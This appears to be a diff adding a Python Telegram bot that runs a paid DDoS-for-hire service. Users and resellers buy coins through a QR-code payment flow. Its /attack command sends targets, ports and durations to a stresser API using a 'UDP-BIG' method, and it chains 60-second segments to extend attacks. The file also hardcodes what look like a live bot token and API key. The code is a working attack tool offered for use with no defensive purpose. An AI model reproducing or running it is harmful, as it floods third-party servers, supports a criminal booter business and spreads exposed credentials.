@@ -1,0 +1,547 @@
+import json
+import datetime
+import os
+import aiohttp
+import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import MessageHandler, filters
+
+TOKEN = "8090649604:AAGS4TlA_awuE7XnZhctM2MedPvQdAJOVZg"
+GROUP_ID = -1002464533692
+ADMIN_IDS = ["5056902784", "757915155"]
+ATTACK_COST = 5
+MAX_ATTACK_DURATION = 120  # Max 120 seconds ab
+RESELLER_COST = 10
+attack_cooldown = {}
+
+# API Configuration
+API_URL = "https://satellitestress.st/api/v1/attack/start"
+API_KEY = "sk_live_d2570fd8a1e2c41ef6139955bf936691f5c2fc562f7a72e988541eaf723bae7e"
+
+# Payment System Config
+OWNERS = ["5056902784", "757915155"]
+PAYMENT_GROUP_ID = -1002302681156
+pending_payments = {}
+awaiting_confirmation = {}
+QR_CODE_PATH = "IMG_20250304_231447_760.jpg"
+
+# Ensure users.json exists
+if not os.path.exists("users.json"):
+    with open("users.json", "w") as f:
+        json.dump({}, f)
+
+def load_users():
+    with open("users.json", "r") as f:
+        return json.load(f)
+
+def save_users(users):
+    with open("users.json", "w") as f:
+        json.dump(users, f, indent=4)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("👋 Welcome to Mahakal Bot! Use commands to interact.")
+
+async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only admins can add resellers!")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 3:
+        await update.message.reply_text("📌 Usage: /addreseller <user_id> <coins>")
+        return
+    
+    reseller_id, coins = command[1], command[2]
+    
+    if not coins.isdigit():
+        await update.message.reply_text("⚠️ Error: Coins must be a number!")
+        return
+    
+    coins = int(coins)
+    
+    users = load_users()
+    users[reseller_id] = {"role": "reseller", "coins": coins}
+    save_users(users)
+
+    await context.bot.send_message(GROUP_ID, f"🛠️ **Admin Action:** Added new reseller!\n👤 Reseller ID: {reseller_id}\n💰 Coins: {coins}")
+    await update.message.reply_text(f"✅ Reseller {reseller_id} added with {coins} coins!")
+
+async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    users = load_users()
+
+    if user_id not in users or not isinstance(users[user_id], dict) or users[user_id].get("role") != "reseller":
+        await update.message.reply_text("❌ Only resellers can add users!")
+        return
+
+    if users[user_id]["coins"] < RESELLER_COST:
+        await update.message.reply_text("⚠️ Not enough coins! Ask admin for more.")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 3:
+        await update.message.reply_text("📌 Usage: /mahakal <user_id> <coins>")
+        return
+    
+    new_user_id, coins = command[1], command[2]
+    
+    if not coins.isdigit():
+        await update.message.reply_text("⚠️ Error: Coins must be a number!")
+        return
+    
+    coins = int(coins)
+    
+    if new_user_id in users:
+        await update.message.reply_text(f"⚠️ User {new_user_id} already exists!")
+        return
+
+    users[new_user_id] = {"role": "user", "coins": coins}
+    users[user_id]["coins"] -= RESELLER_COST
+    save_users(users)
+
+    await context.bot.send_message(GROUP_ID, f"👤 **New User Added!**\n🔹 Reseller: {user_id}\n🔹 User ID: {new_user_id}\n💰 Coins: {coins}")
+    await update.message.reply_text(f"✅ User {new_user_id} added with {coins} coins!")
+
+async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    users = load_users()
+
+    if user_id not in users and user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only resellers and admins can remove users!")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 2:
+        await update.message.reply_text("📌 Usage: /removeuser <user_id>")
+        return
+
+    target_user = command[1]
+
+    if target_user not in users:
+        await update.message.reply_text("⚠️ Error: User does not exist!")
+        return
+
+    if user_id not in ADMIN_IDS:
+        if users[user_id]["role"] != "reseller":
+            await update.message.reply_text("❌ Only resellers and admins can remove users!")
+            return
+        if users[target_user]["role"] == "reseller":
+            await update.message.reply_text("⚠️ Resellers cannot remove other resellers!")
+            return
+
+    del users[target_user]
+    save_users(users)
+
+    await context.bot.send_message(GROUP_ID, f"🗑 **User Removed!**\n🔹 User ID: {target_user}")
+    await update.message.reply_text(f"✅ Successfully removed user {target_user}!")
+
+async def export_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only admins can use this command!")
+        return
+
+    await update.message.reply_document(document=open("users.json", "rb"))
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only admins can use /broadcast!")
+        return
+
+    if not context.args:
+        await update.message.reply_text("📌 Usage: /broadcast <message>")
+        return
+
+    message = " ".join(context.args)
+    users = load_users()
+
+    for uid in users.keys():
+        try:
+            await context.bot.send_message(chat_id=uid, text=f"📢 **Broadcast:** {message}")
+        except:
+            pass
+
+    await context.bot.send_message(GROUP_ID, f"📢 **Admin Broadcast Sent:**\n\n{message}")
+    await update.message.reply_text("✅ Broadcast sent successfully!")
+
+async def send_api_attack(target: str, port: int, duration: int, method: str = "UDP-BIG"):
+    """Send attack request to API"""
+    async with aiohttp.ClientSession() as session:
+        params = {
+            "key": API_KEY,
+            "host": target,
+            "port": port,
+            "time": duration,
+            "method": method
+        }
+        
+        try:
+            async with session.get(API_URL, params=params, timeout=aiohttp.ClientTimeout(total=30)) as response:
+                if response.status == 200:
+                    return await response.json()
+                else:
+                    return {"success": False, "error": f"HTTP {response.status}"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    username = update.message.from_user.username or "Unknown"
+    users = load_users()
+
+    # Authorization check
+    if user_id not in ADMIN_IDS and user_id not in users:
+        await update.message.reply_text("❌ Unauthorized! Buy access from admin.")
+        return
+
+    if user_id not in ADMIN_IDS and users[user_id]["coins"] < ATTACK_COST:
+        await update.message.reply_text("❌ Tere coins khatam ho gaye hain! Mahakal se buy kar.")
+        return
+
+    # Parse command
+    command = update.message.text.split()
+    if len(command) < 4:
+        await update.message.reply_text("📌 Usage: /attack <target> <port> <time>\n💡 Example: /attack 34.0.15.133 19876 60")
+        return
+    
+    target = command[1]
+    port = command[2]
+    attack_time = command[3]
+    method = command[4] if len(command) > 4 else "UDP-BIG"
+
+    if not port.isdigit() or not attack_time.isdigit():
+        await update.message.reply_text("⚠️ Error: Port and Time must be numbers.")
+        return
+
+    port = int(port)
+    attack_time = int(attack_time)
+
+    if attack_time > MAX_ATTACK_DURATION:
+        await update.message.reply_text(f"⏳ Max attack time is {MAX_ATTACK_DURATION} sec.")
+        return
+
+    # Check if user has enough coins
+    if user_id not in ADMIN_IDS:
+        total_cost = ATTACK_COST
+        if users[user_id]["coins"] < total_cost:
+            await update.message.reply_text("❌ Insufficient coins!")
+            return
+        users[user_id]["coins"] -= total_cost
+        save_users(users)
+        remaining_coins = users[user_id]["coins"]
+    else:
+        remaining_coins = "Unlimited"
+
+    # Initial response
+    await update.message.reply_text(
+        f"🎯 **Attack Launched!**\n"
+        f"Target: `{target}:{port}`\n"
+        f"Time: `{attack_time}s`\n"
+        f"Method: `{method}`\n"
+        f"💰 Coins Deducted: `{ATTACK_COST}`\n"
+        f"💰 Remaining Coins: `{remaining_coins}`\n\n"
+        f"⏳ Processing your request..."
+    )
+
+    # Send to group
+    await context.bot.send_message(
+        GROUP_ID,
+        f"⚡ **Attack Alert** ⚡\n"
+        f"👤 User: @{username} (ID: `{user_id}`)\n"
+        f"🎯 Target: `{target}:{port}`\n"
+        f"⏳ Duration: `{attack_time} sec`\n"
+        f"🔧 Method: `{method}`"
+    )
+
+    # Handle attack with auto-continuation for >60 seconds
+    asyncio.create_task(handle_attack_with_continuation(update, target, port, attack_time, method, user_id))
+
+async def handle_attack_with_continuation(update: Update, target: str, port: int, total_time: int, method: str, user_id: str):
+    """Handle attack with automatic continuation for >60 seconds"""
+    MAX_API_DURATION = 60
+    remaining_time = total_time
+    attack_count = 0
+    all_successful = True
+    error_messages = []
+    
+    initial_message_sent = False
+    
+    while remaining_time > 0:
+        # Calculate current attack duration (max 60 seconds per API call)
+        current_duration = min(remaining_time, MAX_API_DURATION)
+        
+        # Send attack request
+        result = await send_api_attack(target, port, current_duration, method)
+        
+        if result.get("success"):
+            attack_id = result.get("attackId", "N/A")
+            attack_count += 1
+            
+            # Send success message for each attack segment
+            if not initial_message_sent:
+                await update.message.reply_text(
+                    f"✅ **Attack {attack_count} Started!**\n"
+                    f"🎯 Target: `{target}:{port}`\n"
+                    f"⏳ Duration: `{current_duration}s`\n"
+                    f"🆔 Attack ID: `{attack_id}`\n\n"
+                    f"📊 Total Progress: `{total_time - remaining_time + current_duration}/{total_time}s`"
+                )
+                initial_message_sent = True
+            else:
+                await update.message.reply_text(
+                    f"🔄 **Continuing Attack {attack_count}...**\n"
+                    f"🎯 Target: `{target}:{port}`\n"
+                    f"⏳ Additional: `{current_duration}s`\n"
+                    f"🆔 Attack ID: `{attack_id}`\n\n"
+                    f"📊 Progress: `{total_time - remaining_time + current_duration}/{total_time}s`"
+                )
+            
+            # Wait for the attack duration
+            await asyncio.sleep(current_duration)
+            remaining_time -= current_duration
+            
+            # If still time remaining, notify about continuation
+            if remaining_time > 0:
+                await update.message.reply_text(
+                    f"⏰ **{current_duration}s completed!**\n"
+                    f"🔄 Starting next attack segment...\n"
+                    f"⏳ Remaining: `{remaining_time}s`"
+                )
+                await asyncio.sleep(2)  # Small gap between attacks
+                
+        else:
+            # Attack failed
+            error_msg = result.get("error", "Unknown error")
+            error_messages.append(error_msg)
+            all_successful = False
+            
+            # Handle concurrent attack limit
+            if "Maximum concurrent attacks reached" in error_msg:
+                await update.message.reply_text(
+                    f"⚠️ **Attack Delayed!**\n"
+                    f"Another attack is already running.\n"
+                    f"Please wait and try again in a few seconds.\n\n"
+                    f"🔄 Auto-retrying in 10 seconds..."
+                )
+                await asyncio.sleep(10)
+                # Don't reduce remaining_time, retry the same segment
+                continue
+            else:
+                await update.message.reply_text(
+                    f"❌ **Attack Failed!**\n"
+                    f"Error: `{error_msg}`\n\n"
+                    f"⚠️ Please try again later."
+                )
+                break
+    
+    # Send final completion message
+    if all_successful and remaining_time == 0:
+        await update.message.reply_text(
+            f"✅ **Attack Completed!**\n"
+            f"🎯 Target: `{target}:{port}`\n"
+            f"⏳ Total Duration: `{total_time} seconds`\n"
+            f"🔧 Method: `{method}`\n"
+            f"📊 Total Segments: `{attack_count}`\n\n"
+            f"💪 Mahakal's blessing is with you!"
+        )
+    elif not all_successful:
+        await update.message.reply_text(
+            f"⚠️ **Attack Partially Completed!**\n"
+            f"🎯 Target: `{target}:{port}`\n"
+            f"✅ Completed: `{total_time - remaining_time}/{total_time}s`\n"
+            f"❌ Failed due to: `{', '.join(error_messages)}`"
+        )
+
+async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    users = load_users()
+
+    if user_id not in users and user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only resellers and admins can top up users.")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 3:
+        await update.message.reply_text("📌 Usage: /topup <user_id> <coins>")
+        return
+
+    target_user, coins = command[1], command[2]
+
+    if not coins.isdigit():
+        await update.message.reply_text("⚠️ Error: Coins must be a number!")
+        return
+
+    coins = int(coins)
+
+    if target_user not in users:
+        await update.message.reply_text("⚠️ Error: User does not exist!")
+        return
+
+    if user_id not in ADMIN_IDS:
+        if users[user_id]["role"] != "reseller":
+            await update.message.reply_text("❌ Only resellers and admins can top up users!")
+            return
+        if users[target_user]["role"] == "reseller":
+            await update.message.reply_text("⚠️ Resellers cannot top up other resellers!")
+            return
+        if users[user_id]["coins"] < coins:
+            await update.message.reply_text("⚠️ Not enough coins!")
+            return
+        users[user_id]["coins"] -= coins  
+
+    users[target_user]["coins"] += coins
+    save_users(users)
+
+    await context.bot.send_message(GROUP_ID, f"💰 **Top-Up Alert** 💰\n\nUser: {target_user} received {coins} coins from {user_id}.")
+    await update.message.reply_text(f"✅ Successfully topped up {coins} coins to {target_user}!")
+
+async def takecoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    users = load_users()
+
+    if user_id not in users and user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Only resellers and admins can take back coins.")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 3:
+        await update.message.reply_text("📌 Usage: /takecoins <user_id> <coins>")
+        return
+
+    target_user, coins = command[1], command[2]
+
+    if not coins.isdigit():
+        await update.message.reply_text("⚠️ Error: Coins must be a number!")
+        return
+
+    coins = int(coins)
+
+    if target_user not in users:
+        await update.message.reply_text("⚠️ Error: User does not exist!")
+        return
+
+    if users[target_user]["coins"] < coins:
+        await update.message.reply_text("⚠️ User does not have enough coins!")
+        return
+
+    if user_id not in ADMIN_IDS:
+        if users[user_id]["role"] != "reseller":
+            await update.message.reply_text("❌ Only resellers and admins can take back coins!")
+            return
+        if users[target_user]["role"] == "reseller":
+            await update.message.reply_text("⚠️ Resellers cannot take coins from other resellers!")
+            return
+        users[user_id]["coins"] += coins  
+
+    users[target_user]["coins"] -= coins
+    save_users(users)
+
+    await context.bot.send_message(GROUP_ID, f"💰 **Coins Taken Back!** 💰\n\nUser: {user_id} took {coins} coins from {target_user}.")
+    await update.message.reply_text(f"✅ Successfully took back {coins} coins from {target_user}!")
+
+async def payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+
+    if not os.path.exists(QR_CODE_PATH):
+        await update.message.reply_text("❌ QR Code file not found!")
+        return
+
+    await update.message.reply_photo(
+        photo=open(QR_CODE_PATH, "rb"),
+        caption="🛒 **Payment System**\n\n✅ Scan the QR Code to make a payment.\n📸 After payment, send a screenshot and transaction ID.\n\n💰 Your coins will be added after verification!"
+    )
+
+    pending_payments[user_id] = True
+    await update.message.reply_text("📤 Please send the **screenshot** of payment along with **Transaction ID**.")
+
+async def receive_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+    username = update.message.from_user.username or "Unknown"
+
+    if user_id not in pending_payments:
+        return
+
+    if update.message.photo:
+        photo = update.message.photo[-1].file_id
+        caption = update.message.caption or "No Transaction ID provided."
+
+        payment_message = (
+            f"🆕 **New Payment Received!**\n"
+            f"👤 **User:** @{username}\n"
+            f"🆔 **User ID:** `{user_id}`\n"
+            f"📜 **Transaction ID:** `{caption}`\n\n"
+            f"✅ Use `/confirmpayment {user_id}` to confirm."
+        )
+
+        for owner in OWNERS:
+            try:
+                await context.bot.send_photo(chat_id=owner, photo=photo, caption=payment_message)
+            except:
+                pass
+        
+        await context.bot.send_photo(chat_id=PAYMENT_GROUP_ID, photo=photo, caption=payment_message)
+
+        awaiting_confirmation[user_id] = True
+        await update.message.reply_text("⏳ **Please wait for payment confirmation.**\nAn admin will verify your payment soon.")
+
+        del pending_payments[user_id]
+
+    else:
+        await update.message.reply_text("⚠️ Please send a valid **screenshot** of the payment!")
+
+async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.message.chat_id)
+
+    if user_id not in OWNERS:
+        await update.message.reply_text("❌ Only owners can confirm payments!")
+        return
+
+    command = update.message.text.split()
+    if len(command) != 2:
+        await update.message.reply_text("📌 Usage: /confirmpayment <user_id>")
+        return
+
+    target_user = command[1]
+
+    if target_user not in awaiting_confirmation:
+        await update.message.reply_text("⚠️ No pending payment found for this user!")
+        return
+
+    try:
+        await context.bot.send_message(chat_id=target_user, text="✅ **Your payment is successfully completed!**")
+    except:
+        pass
+
+    del awaiting_confirmation[target_user]
+    await update.message.reply_text(f"✅ Payment confirmed for user `{target_user}`.")
+
+# Install aiohttp if not present
+try:
+    import aiohttp
+except ImportError:
+    import subprocess
+    subprocess.check_call(['pip', 'install', 'aiohttp'])
+    import aiohttp
+
+app = Application.builder().token(TOKEN).build()
+
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("addreseller", add_reseller))
+app.add_handler(CommandHandler("mahakal", add_user))
+app.add_handler(CommandHandler("removeuser", remove_user))
+app.add_handler(CommandHandler("mahakalusers", export_users))
+app.add_handler(CommandHandler("broadcast", broadcast))
+app.add_handler(CommandHandler("attack", attack))
+app.add_handler(CommandHandler("topup", topup))
+app.add_handler(CommandHandler("takecoins", takecoins))
+app.add_handler(CommandHandler("payment", payment))
+app.add_handler(MessageHandler(filters.PHOTO, receive_payment))
+app.add_handler(CommandHandler("confirmpayment", confirm_payment))
+
+print("🤖 Mahakal Bot is running with API-based attack system...")
+print("✨ Features: Auto-continuation for >60s attacks, Concurrent attack handling")
+app.run_polling()
